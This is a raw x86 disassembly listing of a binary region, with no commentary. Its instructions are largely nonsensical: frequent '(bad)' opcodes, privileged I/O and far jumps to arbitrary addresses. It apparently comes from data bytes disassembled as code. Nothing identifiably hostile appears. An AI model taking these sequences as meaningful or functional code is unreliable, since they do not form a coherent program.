  42d0c6:	mov    eax,0x3221aada
  42d0cb:	jae    0x42d142
  42d0cd:	add    edx,DWORD PTR [ebx+edi*8]
  42d0d0:	ficomp WORD PTR [edi+0x73]
  42d0d3:	loopne 0x42d0f9
  42d0d5:	push   ebp
  42d0d6:	cwde   
  42d0d7:	or     bl,BYTE PTR [ebx]
  42d0d9:	xor    DWORD PTR [ebx+0x2280ffa6],edi
  42d0df:	dec    ebp
  42d0e0:	mov    ecx,0x7900b161
  42d0e5:	or     BYTE PTR [edx],bl
  42d0e7:	shl    cl,0xda
  42d0ea:	dec    ecx
  42d0eb:	push   ss
  42d0ec:	xor    DWORD PTR [esi+0x0],ecx
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    bl,dl
  42d163:	aas    
  42d164:	or     bh,BYTE PTR [eax+0x1e367]
  42d16a:	add    BYTE PTR [ecx],al
  42d16c:	add    BYTE PTR [eax],al
  42d16e:	inc    esp
  42d16f:	neg    BYTE PTR ds:0x4e2a5203
  42d175:	pop    ebx
  42d176:	out    dx,eax
  42d177:	(bad)  
  42d178:	call   FWORD PTR [edi]
  42d17a:	scas   eax,DWORD PTR es:[edi]
  42d17b:	call   0x1250:0xda30edee
  42d182:	retf   
  42d183:	mov    ah,0xbf
  42d185:	fdiv   QWORD PTR [ebp+0x590b3513]
  42d18b:	adc    al,0x69
  42d18d:	aas    
  42d18e:	dec    ebx
  42d18f:	mov    ecx,0xb702e03
  42d194:	jl     0x42d13c
  42d196:	xchg   esp,eax
  42d197:	sti    
  42d198:	xor    bl,BYTE PTR [esi*1+0x1a0f28fd]
  42d19f:	xchg   edx,eax
  42d1a0:	(bad)  
  42d1a1:	pop    esp
  42d1a2:	mov    ch,0x87
  42d1a4:	sub    edx,DWORD PTR [ebp-0x13]
  42d1a7:	cs pushw ds
  42d1aa:	mov    cl,0x27
  42d1ac:	pop    ecx
  42d1ad:	out    dx,al
  42d1ae:	imul   ebp,DWORD PTR [eax-0x5],0xffffff9b
  42d1b2:	push   ebx
  42d1b3:	shl    BYTE PTR [ebp+0x3cce28cc],cl
  42d1b9:	daa    
  42d1ba:	xchg   ecx,eax
  42d1bb:	sub    DWORD PTR gs:[edi+0x3d78ba5a],0xe84cb5c1
  42d1c6:	xor    edx,DWORD PTR [edi+0x1cd6b912]
  42d1cc:	cmp    esi,DWORD PTR [esi]
  42d1ce:	lds    edx,FWORD PTR [edx-0x27]
  42d1d1:	iret   
  42d1d2:	int    0xac
  42d1d4:	popa   
  42d1d5:	enter  0xe982,0xdb
  42d1d9:	inc    edi
  42d1da:	adc    al,0x7c
  42d1dc:	cwde   
  42d1dd:	jge    0x42d17d
  42d1df:	mov    cl,0x4b
  42d1e1:	pop    ds
  42d1e2:	arpl   WORD PTR [ebp-0x290bfad3],dx
  42d1e8:	jge    0x42d231
  42d1ea:	or     bl,BYTE PTR [ebp+0x6f]
  42d1ed:	sbb    DWORD PTR [eax],esp
  42d1ef:	(bad)  
  42d1f0:	retf   0xdd69
  42d1f3:	cmp    edi,DWORD PTR [esi+ecx*4]
  42d1f6:	daa    
  42d1f7:	cmc    
  42d1f8:	xchg   esi,eax
  42d1f9:	push   esp
  42d1fa:	fst    QWORD PTR [ecx]
  42d1fc:	aam    0x96
  42d1fe:	xchg   ebx,eax
  42d1ff:	(bad)  
  42d200:	arpl   WORD PTR fs:[ebx*2+0x1e3f1701],sp
  42d208:	xor    ah,BYTE PTR [edx+0x72cfb55e]
  42d20e:	js     0x42d1a6
  42d210:	ficomp WORD PTR ds:0x2c3a45b7
  42d216:	lea    ecx,ds:0x5e8e4c4
  42d21d:	rcr    esi,0xe1
  42d220:	dec    esi
  42d221:	stos   BYTE PTR es:[edi],al
  42d222:	mov    ds:0x1388374d,al
  42d227:	sbb    eax,0x9fc31eaf
  42d22c:	dec    eax
  42d22d:	jmp    0x72ae10fb
  42d232:	int3   
  42d233:	push   es
  42d234:	dec    ebp
  42d235:	nop
  42d236:	xchg   ebx,eax
  42d237:	(bad)  
  42d238:	mov    ds:0x1595fbf4,al
  42d23d:	inc    ebp
  42d23e:	xchg   esp,eax
  42d23f:	xchg   esi,eax
  42d240:	dec    ax
  42d242:	rcl    BYTE PTR [edx],0x75
  42d245:	lahf   
  42d246:	cmp    DWORD PTR [ebx+0x2d],edx
  42d249:	lods   al,BYTE PTR ds:[esi]
  42d24a:	out    dx,eax
  42d24b:	je     0x42d28d
  42d24d:	ffree  st(1)
  42d24f:	push   edx
  42d250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d251:	sub    DWORD PTR [edx],esi
  42d253:	(bad)  
  42d254:	xor    eax,0x6674cb87
  42d259:	cli    
  42d25a:	add    bh,BYTE PTR [esi-0x53]
  42d25d:	push   edx
  42d25e:	sbb    bh,ch
  42d260:	test   al,0xff
  42d262:	stos   BYTE PTR es:[edi],al
  42d263:	adc    al,0x5c
  42d265:	pushf  
  42d266:	mov    ecx,0x26627da7
  42d26b:	fld    DWORD PTR [ecx+0xd8]
	...
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d360
  42d2e3:	or     BYTE PTR [ecx+0x1e46762],0x0
  42d2ea:	add    BYTE PTR [ecx],al
  42d2ec:	add    BYTE PTR [eax],al
  42d2ee:	pop    ebx
  42d2ef:	fwait
  42d2f0:	cmp    eax,esi
  42d2f2:	xor    BYTE PTR [ebp+ebp*8+0x7f],cl
  42d2f6:	mov    BYTE PTR [eax-0x5e],dl
  42d2f9:	inc    edi
  42d2fa:	push   es
  42d2fb:	cmp    edi,0xffffffe0
  42d2fe:	cdq    
  42d2ff:	pop    ebx
  42d300:	loop   0x42d29b
  42d302:	add    ebp,DWORD PTR [edx]
  42d304:	push   0xb44dab3a
  42d309:	push   es
  42d30a:	imul   edx,DWORD PTR [edx-0x8],0xffffffef
  42d30e:	pop    ecx
  42d30f:	fmul   QWORD PTR ds:0x2fbefa3f
  42d315:	fisubr DWORD PTR [ecx+ebx*8]
  42d318:	push   ds
  42d319:	push   ss
  42d31a:	sbb    dl,bl
  42d31c:	xor    eax,0xb855e905
  42d321:	add    esi,ebp
  42d323:	sub    bh,0x69
  42d326:	sub    al,0x97
  42d328:	pop    eax
  42d329:	(bad)  
  42d32a:	lahf   
  42d32b:	lahf   
  42d32c:	cmc    
  42d32d:	ror    BYTE PTR [esi],0xa3
  42d330:	xor    esp,esi
  42d332:	pop    edi
  42d333:	rcr    BYTE PTR [ecx],0xf4
  42d336:	stos   DWORD PTR es:[edi],eax
  42d337:	lock outs dx,BYTE PTR ds:[esi]
  42d339:	fsubr  st,st(4)
  42d33b:	popa   
  42d33c:	test   BYTE PTR [ecx+eax*1-0x65],dh
  42d340:	stos   BYTE PTR es:[edi],al
  42d341:	(bad)  
  42d342:	fwait
  42d343:	(bad)  
  42d344:	fcmovu st,st(6)
  42d346:	xchg   ebp,eax
  42d347:	nop
  42d348:	cdq    
  42d349:	push   ebp
  42d34a:	les    ecx,FWORD PTR [ebp+0x5f52a906]
  42d350:	push   eax
  42d351:	cmp    ecx,esi
  42d353:	jle    0x42d3a2
  42d355:	adc    DWORD PTR [edx],ebx
  42d357:	test   al,0x1a
  42d359:	mov    ecx,0x1b53fd54
  42d35e:	pusha  
  42d35f:	adc    eax,0x303f86ff
  42d364:	mov    ds:0x35ab25fe,al
  42d369:	fcomi  st,st(2)
  42d36b:	mov    edx,0x6ce6d51b
  42d370:	push   eax
  42d371:	mov    esi,0x31d21b8c
  42d376:	add    dh,BYTE PTR [esp+ebp*1-0x68]
  42d37a:	sbb    DWORD PTR [eax],edi
  42d37c:	sbb    DWORD PTR [esp+esi*4-0x40],ebx
  42d380:	ror    DWORD PTR [edx+edi*2],1
  42d383:	shl    DWORD PTR [ebx-0x66],1
  42d386:	fadd   QWORD PTR [edi-0x65]
  42d389:	and    al,0x31
  42d38b:	cld    
  42d38c:	jbe    0x42d37e
  42d38e:	ror    DWORD PTR [ecx],0xbd
  42d391:	sub    al,0x97
  42d393:	ret    0x4ed9
  42d396:	mov    esi,0xf5e95b1
  42d39b:	cmp    al,0xfd
  42d39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d39e:	xchg   DWORD PTR [esi-0x737c5fd],edx
  42d3a4:	and    eax,0x909fa810
  42d3a9:	pop    esi
  42d3aa:	push   ss
  42d3ab:	push   cs
  42d3ac:	fwait
  42d3ad:	ins    DWORD PTR es:[edi],dx
  42d3ae:	shl    DWORD PTR [eax],cl
  42d3b0:	push   ecx
  42d3b1:	push   ebx
  42d3b2:	pop    esi
  42d3b3:	xor    DWORD PTR [ecx-0x5a],edx
  42d3b6:	cmp    DWORD PTR [eax+0x2325d317],ebx
  42d3bc:	bound  edi,QWORD PTR ds:0x98ed03bc
  42d3c2:	loope  0x42d41e
  42d3c4:	cli    
  42d3c5:	pusha  
  42d3c6:	iret   
  42d3c7:	xchg   esp,eax
  42d3c8:	mov    ecx,0x8849ffb5
  42d3cd:	cld    
  42d3ce:	adc    eax,0xce2d0e56
  42d3d3:	sub    ch,cl
  42d3d5:	(bad)  
  42d3d6:	jmp    0x6d98:0x94274e21
  42d3dd:	data16 mov ds:0x126a6900,al
  42d3e3:	xor    eax,0x2d611b9e
  42d3e8:	std    
  42d3e9:	jp     0x42d3d6
  42d3eb:	lock adc BYTE PTR [edx+0x0],0x0
	...
  42d454:	add    BYTE PTR [eax],al
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	in     eax,0x94
  42d464:	mov    BYTE PTR [ecx+0x1e567],al
  42d46a:	add    BYTE PTR [ecx],al
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	dec    edx
  42d46f:	mov    ds:0xdb9f5f1d,al
  42d474:	enter  0xf184,0xb9
  42d478:	fisttp DWORD PTR [ecx-0x67495576]
  42d47e:	dec    edx
  42d47f:	jmp    0xb1fc29ec
  42d484:	sbb    esp,eax
  42d486:	in     al,0x4d
  42d488:	lea    edi,[ecx+0x3d]
  42d48b:	mov    edi,cs
  42d48d:	push   edi
  42d48e:	das    
  42d48f:	pop    ebp
  42d490:	addr16 sahf 
  42d492:	mov    ah,0x36
  42d494:	sub    DWORD PTR [edi],ecx
  42d496:	jg     0x42d4da
  42d498:	rol    BYTE PTR [edi-0xd],1
  42d49b:	das    
  42d49c:	fidiv  DWORD PTR [eax]
  42d49e:	test   eax,0x5893ab7a
  42d4a3:	fcomp  DWORD PTR ds:0xf26edf67
  42d4a9:	shl    DWORD PTR [eax+edx*1-0x21552eda],cl
  42d4b0:	dec    esi
  42d4b1:	mov    dl,0x83
  42d4b3:	and    BYTE PTR [edi+eax*2-0x7e3ce516],0x95
  42d4bb:	ins    BYTE PTR es:[edi],dx
  42d4bc:	mov    eax,ds:0x18479ed4
  42d4c1:	outs   dx,BYTE PTR ds:[esi]
  42d4c2:	inc    esp
  42d4c3:	xor    eax,DWORD PTR [ebx]
  42d4c5:	outs   dx,BYTE PTR ds:[esi]
  42d4c6:	xor    al,0x9a
  42d4c8:	ret    
  42d4c9:	or     bl,dl
  42d4cb:	out    dx,eax
  42d4cc:	add    bh,BYTE PTR [edx]
  42d4ce:	and    ecx,0xc37ea1bf
  42d4d4:	add    al,0x69
  42d4d6:	or     esp,edx
  42d4d8:	sub    ebx,DWORD PTR [ecx+0x440f04b5]
  42d4de:	ja     0x42d4ac
  42d4e0:	(bad)
  42d4e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4e4:	push   es
  42d4e5:	cdq    
  42d4e6:	dec    esi
  42d4e7:	lock xchg edx,eax
  42d4e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4ea:	lahf   
  42d4eb:	inc    esp
  42d4ec:	loop   0x42d56a
  42d4ee:	jno    0x42d482
  42d4f0:	mov    ah,0x56
  42d4f2:	add    al,0x78
  42d4f4:	(bad)  
  42d4f6:	in     al,0x5a
  42d4f8:	jnp    0x42d502
  42d4fa:	(bad)  
  42d4fb:	fs int 0x4f
  42d4fe:	xor    eax,0xd1075ba5
  42d503:	arpl   WORD PTR [ebx+0x1e56cc86],di
  42d509:	cld    
  42d50a:	fwait
  42d50b:	dec    edx
  42d50c:	pop    eax
  42d50d:	push   ebx
  42d50e:	or     ebx,ebp
  42d510:	ins    DWORD PTR es:[edi],dx
  42d511:	repnz arpl WORD PTR [ecx+ebp*2],bx
  42d515:	data16 scas al,BYTE PTR es:[edi]
  42d517:	in     eax,dx
  42d518:	cmp    DWORD PTR [ecx+0x3cbbfebf],ebp
  42d51e:	and    eax,0x2af29e4d
  42d523:	aas    
  42d524:	ret    0x1fc0
  42d527:	cli    
  42d528:	pop    ss
  42d529:	pop    esi
  42d52a:	xchg   edx,eax
  42d52b:	and    al,0xed
  42d52d:	popf   
  42d52e:	sbb    ebx,DWORD PTR [ebx-0x4a745a71]
  42d534:	add    DWORD PTR [ebp+0x27],esp
  42d537:	les    eax,FWORD PTR ds:0x6af34f5d
  42d53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d53e:	fwait
  42d53f:	stc    
  42d540:	jbe    0x42d527
  42d542:	ins    DWORD PTR es:[edi],dx
  42d543:	sahf   
  42d544:	dec    ecx
  42d545:	xchg   ecx,eax
  42d546:	fst    QWORD PTR [ebx+0x3b]
  42d549:	dec    ebp
  42d54a:	and    eax,edx
  42d54c:	stos   DWORD PTR es:[edi],eax
  42d54d:	retf   
  42d54e:	pop    edi
  42d54f:	and    al,0x36
  42d551:	inc    edi
  42d552:	xchg   ebx,eax
  42d553:	jmp    0x88d8b4ed
  42d558:	pop    esi
  42d559:	jmp    0xcb40:0x7d15b843
  42d560:	sub    al,0x9
  42d562:	push   ebx
  42d563:	mov    dh,0x94
  42d565:	adc    DWORD PTR [ecx],0xeef6e67c
  42d56b:	lods   eax,DWORD PTR ds:[esi]
  42d56c:	bound  ebx,QWORD PTR [edi+0x0]
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x68b546d5,eax
  42d5e5:	or     eax,0x1e667
  42d5ea:	add    BYTE PTR [ecx],al
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	pop    ds
  42d5ef:	push   ds
  42d5f0:	xor    BYTE PTR [eax],0x10
  42d5f3:	mov    cl,0xef
  42d5f5:	push   esp
  42d5f6:	add    eax,0xb59f9a8b
  42d5fb:	inc    eax
  42d5fc:	cdq    
  42d5fd:	aas    
  42d5fe:	xor    al,0xeb
  42d600:	pop    ds
  42d601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d602:	mov    DWORD PTR [eax+0x20],edi
  42d605:	stos   BYTE PTR es:[edi],al
  42d606:	inc    esi
  42d607:	dec    ebp
  42d608:	inc    edx
  42d609:	or     al,0x7f
  42d60b:	mov    al,ds:0x467529dc
  42d610:	aam    0x3d
  42d612:	mov    dh,0xb6
  42d614:	out    0xf9,eax
  42d616:	and    DWORD PTR [esi-0x56],ebx
  42d619:	in     eax,0x7e
  42d61b:	lock lea ebx,[ecx+0x11]
  42d61f:	add    al,0x53
  42d621:	mov    esi,0xb564d0c1
  42d626:	pushf  
  42d627:	inc    ecx
  42d628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d629:	stc    
  42d62a:	mov    ecx,0x7a76b777
  42d62f:	sub    ecx,ecx
  42d631:	std    
  42d632:	push   esi
  42d633:	jl     0x42d5fd
  42d635:	xlat   BYTE PTR ds:[ebx]
  42d636:	dec    esp
  42d637:	cli    
  42d638:	fwait
  42d639:	lds    esi,FWORD PTR [esi-0x1e063519]
  42d63f:	dec    ebp
  42d640:	add    esp,eax
  42d642:	push   0xb62ef5a9
  42d647:	jge    0x42d624
  42d649:	xor    al,0x1d
  42d64b:	mov    eax,ds:0xb6a7d0c8
  42d650:	inc    edx
  42d651:	mov    bh,0x21
  42d653:	pop    edi
  42d654:	inc    esi
  42d655:	mov    ds:0xd7946166,al
  42d65a:	lahf   
  42d65b:	icebp  
  42d65c:	stos   BYTE PTR es:[edi],al
  42d65d:	adc    BYTE PTR [ebx+0x4fc5fab],al
  42d663:	jmp    0x42d64a
  42d665:	sahf   
  42d666:	add    bl,bh
  42d668:	pop    ecx
  42d669:	outs   dx,BYTE PTR ds:[esi]
  42d66a:	dec    eax
  42d66b:	rol    BYTE PTR [eax-0x4c8ffb85],0x76
  42d672:	aas    
  42d673:	add    al,0xa1
  42d675:	push   ebp
  42d676:	test   BYTE PTR [ebp+0x4bbc8114],al
  42d67c:	ins    DWORD PTR es:[edi],dx
  42d67d:	enter  0x8ab1,0x67
  42d681:	fwait
  42d682:	or     DWORD PTR [ebx],esi
  42d684:	sbb    eax,0xe3d48bf7
  42d689:	jo     0x42d6b2
  42d68b:	mov    ebx,0xef7b6067
  42d690:	push   cs
  42d691:	add    BYTE PTR [ebx],0x76
  42d694:	outs   dx,DWORD PTR ds:[esi]
  42d695:	test   DWORD PTR [ecx-0x6b],edx
  42d698:	retf   
  42d699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d69a:	xchg   ebp,eax
  42d69b:	pop    ebp
  42d69c:	push   cs
  42d69d:	ror    BYTE PTR [esi],1
  42d69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6a0:	mov    al,ds:0xc0c693fc
  42d6a5:	outs   dx,BYTE PTR ds:[esi]
  42d6a6:	(bad)  
  42d6a7:	xor    edi,esi
  42d6a9:	not    DWORD PTR [edx-0x1b]
  42d6ac:	(bad)  
  42d6ad:	and    al,0xa1
  42d6af:	rol    esi,1
  42d6b1:	cmp    ecx,ecx
  42d6b3:	pusha  
  42d6b4:	xor    bh,BYTE PTR [ebp+ecx*1+0x54b9f099]
  42d6bb:	push   edx
  42d6bc:	xor    DWORD PTR [esi],0xcdb009d1
  42d6c2:	ret    0x47c1
  42d6c5:	xchg   edx,eax
  42d6c6:	sysexit 
  42d6c8:	scas   al,BYTE PTR es:[edi]
  42d6c9:	(bad)  
  42d6ca:	jmp    0x586:0xb09ef83c
  42d6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6d2:	jnp    0x42d6c6
  42d6d4:	and    bh,BYTE PTR ds:0x86c43278
  42d6da:	pop    esi
  42d6db:	lds    ebp,FWORD PTR [ebp-0x703d555d]
  42d6e1:	cli    
  42d6e2:	inc    esi
  42d6e3:	mov    esi,0xe275c809
  42d6e8:	pop    eax
  42d6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6ea:	jmp    0xd9bdb4
	...
  42d753:	add    BYTE PTR [eax],al
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0xc6
  42d763:	sbb    BYTE PTR [edx],al
  42d765:	jb     0x42d7ce
  42d767:	out    0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    dl,dh
  42d76f:	push   esi
  42d770:	jno    0x42d7d3
  42d772:	pop    ss
  42d773:	push   esi
  42d774:	pusha  
  42d775:	adc    al,0x32
  42d777:	clc    
  42d778:	push   ss
  42d779:	pop    ss
  42d77a:	outs   dx,BYTE PTR ds:[esi]
  42d77b:	xor    cl,cl
  42d77d:	xor    edi,DWORD PTR [eax]
  42d77f:	push   ecx
  42d780:	not    BYTE PTR [ebx-0x5c]
  42d783:	not    eax
  42d785:	pop    ebp
  42d786:	xchg   edi,eax
  42d787:	stc    
  42d788:	dec    eax
  42d789:	and    DWORD PTR [ebx-0x78],esi
  42d78c:	aam    0x8f
  42d78e:	push   edx
  42d78f:	and    edx,ebp
  42d791:	cwde   
  42d792:	cmp    al,0x7b
  42d794:	stc    
  42d795:	jl     0x42d72c
  42d797:	mov    dh,ch
  42d799:	add    BYTE PTR [ecx],cl
  42d79b:	lea    ebx,[eax+0x3e]
  42d79e:	mov    al,0xd6
  42d7a0:	xor    BYTE PTR [esi+ebp*2+0x6e253c5b],al
  42d7a7:	sub    edx,edi
  42d7a9:	test   eax,0x50a7328f
  42d7ae:	imul   esp,DWORD PTR [esi],0x2594b8e3
  42d7b4:	mov    ch,0x9d
  42d7b6:	rcl    DWORD PTR [eax-0x3b729746],0x40
  42d7bd:	in     al,dx
  42d7be:	loopne 0x42d7d9
  42d7c0:	test   DWORD PTR [esi+0x2751570c],edx
  42d7c6:	stos   DWORD PTR es:[edi],eax
  42d7c7:	xchg   esi,eax
  42d7c8:	ja     0x42d825
  42d7ca:	jg     0x42d770
  42d7cc:	imul   edi,DWORD PTR es:[eax+0x25],0x59790a49
  42d7d4:	fsubr  DWORD PTR [edx-0xaa3f9e6]
  42d7da:	rol    BYTE PTR [edx+0x67ff2007],cl
  42d7e0:	test   al,0x5b
  42d7e2:	addr16 test eax,0x78b72d2
  42d7e8:	xor    DWORD PTR [edi+0x2841fe5b],ecx
  42d7ee:	js     0x42d796
  42d7f0:	inc    ebx
  42d7f1:	jp     0x42d7f6
  42d7f3:	jg     0x42d84e
  42d7f5:	sahf   
  42d7f6:	in     al,dx
  42d7f7:	out    0x84,eax
  42d7f9:	fistp  DWORD PTR [eax-0x34823c9b]
  42d800:	repz push edi
  42d802:	je     0x42d834
  42d804:	xchg   edi,eax
  42d805:	push   0x52
  42d807:	xor    eax,0xb91c15d6
  42d80c:	in     al,0xa5
  42d80e:	cli    
  42d80f:	or     bl,BYTE PTR [edi+0x78]
  42d812:	add    eax,0x308b865c
  42d817:	repz sub edx,esi
  42d81a:	xchg   edi,eax
  42d81b:	rcl    BYTE PTR [ebx+0x41],0x88
  42d81f:	xor    al,0xa1
  42d821:	fsubp  st(0),st
  42d823:	push   0x4689e7df
  42d828:	fwait
  42d829:	dec    esp
  42d82a:	mov    esi,0xd669f880
  42d82f:	lahf   
  42d830:	fst    DWORD PTR [ebx-0x2b]
  42d833:	repz dec esp
  42d835:	or     esi,esp
  42d837:	pop    es
  42d838:	lahf   
  42d839:	sub    dl,cl
  42d83b:	aas    
  42d83c:	out    0xd1,eax
  42d83e:	lods   eax,DWORD PTR ds:[esi]
  42d83f:	paddsb mm4,QWORD PTR [edi+0x48]
  42d843:	gs push 0x31
  42d846:	ret    0xf7b6
  42d849:	enter  0x4699,0x52
  42d84d:	ja     0x42d89f
  42d84f:	pop    es
  42d850:	std    
  42d851:	inc    ecx
  42d852:	add    ah,BYTE PTR [eax]
  42d854:	pop    ebx
  42d855:	adc    edi,DWORD PTR [ecx+ecx*8-0x61]
  42d859:	mov    dl,0x85
  42d85b:	or     eax,0xccda73ba
  42d860:	test   BYTE PTR [esi+0x3782874f],bh
  42d866:	sbb    al,0xa9
  42d868:	out    0x7a,eax
  42d86a:	xlat   BYTE PTR ds:[ebx]
  42d86b:	or     dl,BYTE PTR [ebx]
  42d86d:	dec    esp
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x39c6961a
  42d8e3:	nop
  42d8e4:	mov    ebx,0x1e867b6
  42d8e9:	add    BYTE PTR [eax],al
  42d8eb:	add    DWORD PTR [eax],eax
  42d8ed:	add    BYTE PTR [ecx+0x7131d4ff],dh
  42d8f3:	ins    DWORD PTR es:[edi],dx
  42d8f4:	push   0xc8177340
  42d8f9:	jmp    0xe22cd52b
  42d8fe:	pushf  
  42d8ff:	sbb    edi,edi
  42d901:	adc    eax,0x6bfc7f1e
  42d906:	xor    BYTE PTR [ecx+0x1e914fad],bh
  42d90c:	mov    edi,0x1f9bf44f
  42d911:	fisub  DWORD PTR [esi]
  42d913:	cmp    edi,ecx
  42d915:	dec    esp
  42d916:	jp     0x42d8b0
  42d918:	(bad)  
  42d919:	mov    dh,0x20
  42d91b:	adc    eax,0xb77a85d7
  42d920:	mov    esp,DWORD PTR [ebp+0x19]
  42d923:	(bad)  [edi-0x25]
  42d926:	shl    BYTE PTR [ebx+0x12],0xd3
  42d92a:	bound  ecx,QWORD PTR [ecx]
  42d92c:	stc    
  42d92d:	sub    eax,0xf1a1d0a1
  42d932:	mov    al,0xef
  42d934:	adc    eax,0x62893bc4
  42d939:	sbb    esi,DWORD PTR ds:0x666fd4da
  42d93f:	scas   al,BYTE PTR es:[edi]
  42d940:	sbb    esi,edx
  42d942:	jne    0x42d97b
  42d944:	cmc    
  42d945:	adc    ebp,ebx
  42d947:	ds enter 0xe756,0x9b
  42d94c:	aas    
  42d94d:	loopne 0x42d921
  42d94f:	xchg   esi,eax
  42d950:	xlat   BYTE PTR ds:[ebx]
  42d951:	out    dx,al
  42d952:	std    
  42d953:	push   edi
  42d954:	or     BYTE PTR [edx+0x0],dl
  42d957:	scas   al,BYTE PTR es:[edi]
  42d958:	leave  
  42d959:	sti    
  42d95a:	ja     0x42d9a6
  42d95c:	push   ebp
  42d95d:	mov    ah,0xf7
  42d95f:	dec    ecx
  42d960:	cli    
  42d961:	(bad)  
  42d962:	push   edi
  42d963:	fs cmp al,0x4b
  42d966:	rol    DWORD PTR [edi+0x375bcaf4],cl
  42d96c:	and    BYTE PTR [ebx-0x12],al
  42d96f:	pop    esp
  42d970:	out    0xf4,al
  42d972:	or     al,0x2d
  42d974:	clc    
  42d975:	int3   
  42d976:	sbb    al,0x72
  42d978:	jecxz  0x42d9b1
  42d97a:	add    cl,BYTE PTR [ecx+ebx*4-0x44d97aaf]
  42d981:	jl     0x42d92c
  42d983:	cmc    
  42d984:	mov    esi,0xab34b49b
  42d989:	(bad)  
  42d98b:	cs push es
  42d98d:	mov    eax,0x94a930e7
  42d992:	cdq    
  42d993:	jp     0x42d944
  42d995:	lods   al,BYTE PTR ds:[esi]
  42d996:	push   ebx
  42d997:	sub    DWORD PTR [ecx-0x33b5f7d2],0xffffffac
  42d99e:	cmp    eax,edi
  42d9a0:	xor    bh,BYTE PTR [ebp-0x56355bee]
  42d9a6:	mov    ah,0xd
  42d9a8:	call   0xe2e7:0x32db501b
  42d9af:	fidiv  DWORD PTR [edi+0x29]
  42d9b2:	mov    ds:0xfad086b,al
  42d9b7:	cmp    cl,0x93
  42d9ba:	pop    es
  42d9bb:	stos   BYTE PTR es:[edi],al
  42d9bc:	push   DWORD PTR ds:[edx-0x6a]
  42d9c0:	stos   DWORD PTR es:[edi],eax
  42d9c1:	inc    ebp
  42d9c2:	mov    ch,0xdf
  42d9c4:	and    ch,ah
  42d9c6:	cmp    al,0x98
  42d9c8:	xchg   ebp,eax
  42d9c9:	jmp    0x42d9ba
  42d9cb:	xor    al,0x5a
  42d9cd:	bound  ebx,QWORD PTR [ebx]
  42d9cf:	mul    DWORD PTR [ecx]
  42d9d1:	rcl    BYTE PTR [ecx+0x3e52ce1e],1
  42d9d7:	loop   0x42da2d
  42d9d9:	add    BYTE PTR [ebx],al
  42d9db:	neg    DWORD PTR [eax]
  42d9dd:	mov    BYTE PTR [ebx],dl
  42d9df:	and    DWORD PTR [ecx+0x20],ecx
  42d9e2:	fimul  DWORD PTR [ebp+0x63]
  42d9e5:	ret    
  42d9e6:	jnp    0x42da35
  42d9e8:	int    0x6f
  42d9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9eb:	dec    ebx
  42d9ec:	mov    eax,ds:0xbc
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	pop    edi
  42da63:	ret    0x6c
  42da66:	addr16 jmp 0x142da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	sub    edx,edi
  42da70:	add    BYTE PTR [ecx-0x232b0d4b],ah
  42da76:	add    ecx,edx
  42da78:	lahf   
  42da79:	arpl   WORD PTR [ecx-0x7746ea46],sp
  42da7f:	lea    esp,[esi-0x43]
  42da82:	sbb    eax,0xee6431e9
  42da87:	add    eax,0x28fe0d08
  42da8c:	cmp    eax,0xbb09952a
  42da91:	icebp  
  42da92:	cmp    cl,bl
  42da94:	xchg   ebx,eax
  42da95:	das    
  42da96:	add    bl,BYTE PTR [esi+0x75]
  42da99:	popa   
  42da9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da9b:	sbb    BYTE PTR [ebx],0x4f
  42da9e:	pop    DWORD PTR [ebx-0x566efde8]
  42daa4:	or     ebx,0x63
  42daa7:	inc    esi
  42daa8:	mov    esp,0xb618420b
  42daad:	ins    BYTE PTR es:[edi],dx
  42daae:	fisttp QWORD PTR [eax+0x6e205d39]
  42dab4:	push   ss
  42dab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dab6:	icebp  
  42dab7:	push   ds
  42dab8:	add    ah,BYTE PTR [edx+0x6]
  42dabb:	mov    ds:0x9b3cba1,eax
  42dac0:	push   edi
  42dac1:	xchg   BYTE PTR [ebx],ah
  42dac3:	leave  
